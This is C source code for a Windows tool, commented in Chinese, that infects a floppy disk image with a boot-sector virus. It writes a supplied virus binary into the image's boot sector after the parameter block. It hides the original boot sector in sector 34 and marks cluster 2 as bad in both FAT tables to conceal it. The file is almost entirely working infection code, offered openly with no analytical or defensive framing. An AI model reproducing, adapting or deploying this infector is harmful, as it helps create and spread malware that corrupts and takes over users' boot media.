#include <stdio.h>
#include <windows.h>
#define CODESTART 0x3e
unsigned long getFileSize(char * fileName, bool * success)
{
	unsigned long high;
	unsigned long low;
	HANDLE h1;
	h1 = CreateFileA(fileName, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (h1 == 0)
	{
		*success = false;
		return 0xffffffff;
	}
	low = GetFileSize((void *)h1, &high); 
	if (low == 0xffffffff)
	{
		* success = false;
		CloseHandle(h1);
		return 0xffffffff;
	}
	* success = true;
	CloseHandle(h1);
	return high + low;
}

void main(int argc, char* argv[])
{
	FILE * fp;
	if (argc != 3)
	{
		printf("usage error, like the infectbootsector virusfile, floppyfile\n");
		return;
	}
	bool success;
	
	char *flp, *virfile;
	flp = argv[2];
	virfile = argv[1];
	unsigned long size = getFileSize(flp, &success);
	if (!success)
	{
		printf("floppy file error\n");
		return;
	}
	if (size != 1474560)
	{
		printf("floppy file size is error\n");
		return;
	}
	size = getFileSize(virfile, &success);
	if (!success)
	{
		printf("virus file error\n");
		return;
	}
	
	if (size > 512 - CODESTART - 2)//2 是 结尾的那个标识符55 aa
	{
		printf("virus file is larger than %d\n", 512 - CODESTART - 2);
		return;
	}
	char boot[512], virus[512];
	char c;
	FILE * fv;
	fp = fopen(flp, "rb+");
	if (fp == NULL)
	{
		printf("open floppy error\n");
		return;
	}
	fread(boot, 1, 512, fp);//读入原来引导扇区
	fv = fopen(virfile, "rb");//打开病毒文件
	if (fv == NULL)
	{
		printf("open virusfile error\n");
		return;
	}
	fread(virus, 1, size, fv);//读入病毒，占size个字节
	fclose(fv);
	fseek(fp, CODESTART, SEEK_SET);//用fseek定位到引导记录后才拷贝
	fwrite(virus + CODESTART, 1, size - CODESTART, fp);//write boot sector
	fseek(fp, 33 * 512, SEEK_SET);//将原扇区内容写入第34个扇区
	fwrite(boot, 1, 512, fp);//save old boot sector
	//change the fat1 cluster 2 as bad cluster
	//因约定用第34扇区保存原引导区，所以fat表对应的簇2项用坏簇标记
	fseek(fp, 512 + 3, SEEK_SET);//该fat1的簇2项，从第4字节开始，所以加3
	c = 0xf7;//坏簇为0xff7
	fwrite(&c, 1, 1, fp);
	c = 0x0f;
	fwrite(&c, 1, 1, fp);
	//change the fat2 cluster 2 as bad cluster
	fseek(fp, 512 + 9 * 512 + 3, SEEK_SET);//改fat2的簇2项
	//512是boot扇区的大小
	//9*512是fat表大小，因有9个扇区
	c = 0xf7;
	fwrite(&c, 1, 1, fp);
	c = 0x0f;
	fwrite(&c, 1, 1, fp);
	fclose(fp);
}